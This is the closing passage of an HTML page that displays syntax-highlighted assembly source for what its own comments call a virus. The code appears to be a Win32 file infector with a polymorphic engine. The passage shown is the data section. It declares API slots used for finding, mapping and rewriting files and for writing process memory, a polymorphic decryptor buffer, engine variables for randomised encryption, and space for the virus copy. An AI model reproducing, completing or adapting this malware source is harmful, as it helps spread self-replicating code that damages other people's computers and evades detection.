</span><span class="sc5">safety_01</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

                </span><span class="sc1">;Polymorphic decryptor buffer</span><span class="sc0">

</span><span class="sc5">poly_decryptor</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">DECRYPTOR_SIZE</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">inf_end</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

                </span><span class="sc1">;Virus uninitialized data</span><span class="sc0">

</span><span class="sc5">a_Kernel32</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_User32</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_GetModuleH</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_GetProcAddr</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

                </span><span class="sc1">;API entry point for each viral function</span><span class="sc0">

</span><span class="sc5">viral_addresses</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">a_CreateFile</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_CreateFileMap</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_MapViewOfFile</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_UnmapView</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_CloseHandle</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_FindFirst</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_FindNext</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_FindClose</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_VirtualAlloc</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_GetWindowsDir</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_GetSystemDir</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_GetCurDir</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_SetFileAttr</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_SetFileTime</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_DeleteFile</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_GetCurProc</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_WriteProcMem</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_LoadLibrary</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_GetSysTime</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

                </span><span class="sc1">;Misc variables</span><span class="sc0">

</span><span class="sc5">CreateFile_h</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">Mapping_h</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">Search_h</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">File_Attr</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">search_raw</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">original_size</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">h_icon</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">dc_screen</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

                </span><span class="sc1">;Data used by the polymorphic engine</span><span class="sc0">

</span><span class="sc5">rnd32_seed</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Seed for random number generator</span><span class="sc0">
</span><span class="sc5">ptr_disp</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Displacement from index</span><span class="sc0">
</span><span class="sc5">end_value</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Index end value</span><span class="sc0">
</span><span class="sc5">delta_call</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Used into delta_offset routines</span><span class="sc0">
</span><span class="sc5">loop_point</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Start address of decryption loop</span><span class="sc0">
</span><span class="sc5">crypt_key</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Encryption key</span><span class="sc0">
</span><span class="sc5">oper_size</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">;Size used (1=Byte 2=Word 4=Dword)</span><span class="sc0">
</span><span class="sc5">index_mask</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">;Mask of register used as index</span><span class="sc0">
</span><span class="sc5">counter_mask</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">;Mask of register used as counter</span><span class="sc0">
</span><span class="sc5">build_flags</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">;Some decryptor flags</span><span class="sc0">
</span><span class="sc5">recursive_level</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">;Garbage recursive layer</span><span class="sc0">

                </span><span class="sc1">;Decryptor flags aliases</span><span class="sc0">

</span><span class="sc5">CRYPT_DIRECTION</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc5">CRYPT_CMPCTR</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
</span><span class="sc5">CRYPT_CDIR</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
</span><span class="sc5">CRYPT_SIMPLEX</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc5">CRYPT_COMPLEX</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">

                </span><span class="sc1">;Buffer to convert file time to system time</span><span class="sc0">

</span><span class="sc5">my_system_time</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">time_year</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">time_month</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">time_dayofweek</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">time_day</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">time_hour</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">time_minute</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">time_seconds</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">time_milisec</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">

                </span><span class="sc1">;Buffer for \WINDOWS and \SYSTEM directories</span><span class="sc0">

</span><span class="sc5">szWorkDir</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc1">;Data about found files</span><span class="sc0">

</span><span class="sc5">my_FindData</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">SIZEOF_WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc1">;This will be the place for the virus copy</span><span class="sc0">

</span><span class="sc5">mem_end</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">virseg</span><span class="sc0">          </span><span class="sc9">ends</span><span class="sc0">

                </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">host_entry</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span></div></body>
</html>
